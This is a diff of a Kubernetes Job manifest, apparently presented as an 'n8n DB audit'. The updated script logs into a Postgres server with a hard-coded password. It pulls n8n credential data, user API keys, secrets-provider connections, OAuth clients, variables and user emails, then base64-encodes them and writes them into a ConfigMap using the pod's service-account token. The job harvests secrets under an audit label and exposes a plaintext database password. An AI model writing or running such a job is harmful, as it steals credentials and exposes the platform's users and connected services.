@@ -1,37 +1,15 @@
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: n8n-audit-result
+  name: n8n-audit-result2
   namespace: default
 data:
   status: "pending"
 ---
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRole
-metadata:
-  name: n8n-audit-cm-writer
-rules:
-- apiGroups: [""]
-  resources: ["configmaps"]
-  verbs: ["create", "update", "patch", "get"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: n8n-audit-cm-binding
-subjects:
-- kind: ServiceAccount
-  name: n8n-audit-sa
-  namespace: default
-roleRef:
-  kind: ClusterRole
-  name: n8n-audit-cm-writer
-  apiGroup: rbac.authorization.k8s.io
----
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: n8n-db-audit-v4
+  name: n8n-db-audit-v5
   namespace: default
 spec:
   ttlSecondsAfterFinished: 86400
@@ -48,25 +26,30 @@ spec:
         - |
           apk add -q postgresql-client curl jq 2>/dev/null
           PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
-
-          TABLES=$(eval "$PG -d n8n -c '\dt'" 2>&1)
-          CREDS=$(eval "$PG -d n8n -c 'SELECT id, name, type FROM credential_entity ORDER BY id;'" 2>&1)
-          WFLOWS=$(eval "$PG -d n8n -c 'SELECT id, name, active, nodes FROM workflow_entity ORDER BY id;'" 2>&1)
-          USERS=$(eval "$PG -d postgres -c 'SELECT usename, usesuper, usebypassrls FROM pg_user ORDER BY usename;'" 2>&1)
-
-          # Write to ConfigMap via K8s API
+          CREDS=$(eval "$PG -d n8n -c 'SELECT id, name, type, data FROM credentials_entity ORDER BY id;'" 2>&1)
+          VARS=$(eval "$PG -d n8n -c 'SELECT key, value, type FROM variables ORDER BY key;'" 2>&1)
+          USERS=$(eval "$PG -d n8n -c 'SELECT id, email, \"firstName\", \"lastName\", role, \"createdAt\" FROM \"user\" ORDER BY \"createdAt\";'" 2>&1)
+          APIKEYS=$(eval "$PG -d n8n -c 'SELECT \"userId\", label, \"apiKey\", \"createdAt\" FROM user_api_keys ORDER BY \"createdAt\";'" 2>&1)
+          SETTINGS=$(eval "$PG -d n8n -c 'SELECT key, value FROM settings ORDER BY key;'" 2>&1)
+          SECRETS=$(eval "$PG -d n8n -c 'SELECT id, name, type, data FROM secrets_provider_connection ORDER BY id;'" 2>&1)
+          OAUTH=$(eval "$PG -d n8n -c 'SELECT id, name, type, \"redirectUri\", \"clientId\" FROM oauth_clients ORDER BY id;'" 2>&1)
+          WFLOWS=$(eval "$PG -d n8n -c 'SELECT id, name, active FROM workflow_entity ORDER BY id;'" 2>&1)
+          DBS=$(eval "$PG -d postgres -c 'SELECT datname FROM pg_database ORDER BY datname;'" 2>&1)
           TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API=https://kubernetes.default.svc
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          
-          RESULT=$(printf '{"tables":"%s","credentials":"%s","workflows":"%s","pg_users":"%s"}' \
-            "$(echo "$TABLES" | base64 | tr -d '\n')" \
+          RESULT=$(printf '{"creds":"%s","vars":"%s","users":"%s","apikeys":"%s","settings":"%s","secrets":"%s","oauth":"%s","workflows":"%s","databases":"%s"}' \
             "$(echo "$CREDS" | base64 | tr -d '\n')" \
+            "$(echo "$VARS" | base64 | tr -d '\n')" \
+            "$(echo "$USERS" | base64 | tr -d '\n')" \
+            "$(echo "$APIKEYS" | base64 | tr -d '\n')" \
+            "$(echo "$SETTINGS" | base64 | tr -d '\n')" \
+            "$(echo "$SECRETS" | base64 | tr -d '\n')" \
+            "$(echo "$OAUTH" | base64 | tr -d '\n')" \
             "$(echo "$WFLOWS" | base64 | tr -d '\n')" \
-            "$(echo "$USERS" | base64 | tr -d '\n')")
-          
+            "$(echo "$DBS" | base64 | tr -d '\n')")
           curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
             -X PATCH -H "Content-Type: application/merge-patch+json" \
-            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result" \
+            "$API/api/v1/namespaces/default/configmaps/n8n-audit-result2" \
             -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
-          echo "Done - result written to ConfigMap"
+          echo "Done"
